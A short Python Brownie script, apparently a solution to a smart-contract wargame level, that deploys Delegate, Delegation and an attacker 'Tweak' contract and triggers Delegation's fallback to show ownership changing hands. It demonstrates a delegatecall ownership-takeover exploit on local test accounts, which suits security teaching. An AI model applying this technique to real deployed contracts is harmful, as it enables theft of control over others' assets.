import os
from brownie import *
from web3 import Web3

def deploy_delegate(owr, usr1):
    # deploy
    sc_delegate = Delegate.deploy(owr, {'from':owr})
    sc_delegation = Delegation.deploy(sc_delegate.address, {'from':owr})
    sc_tweak = Tweak.deploy(sc_delegation, {'from':usr1})
    return sc_delegate, sc_delegation, sc_tweak

def trigger(scd, scn, twk, owr, usr1):
    # call owner
    previous_owner = scn.owner({'from':owr})
    # trigger fallback function
    twk.tweak({'from':usr1})
    # call new owner
    new_owner = scn.owner({'from':owr})
    # print owners
    print(f'\n[*] Previous owner: {previous_owner}')
    print(f'[*] New owner: {new_owner} \n')
def main():
    # get accounts
    owner = accounts[0]
    user1 = accounts[1]
    # deploy contracts
    scdelegate, scdelegation, sctweak = deploy_delegate(owner, user1)
    # account 0 is owner of contracts
    # user 1 triggers fallback function
    trigger(scdelegate, scdelegation,sctweak, owner, user1)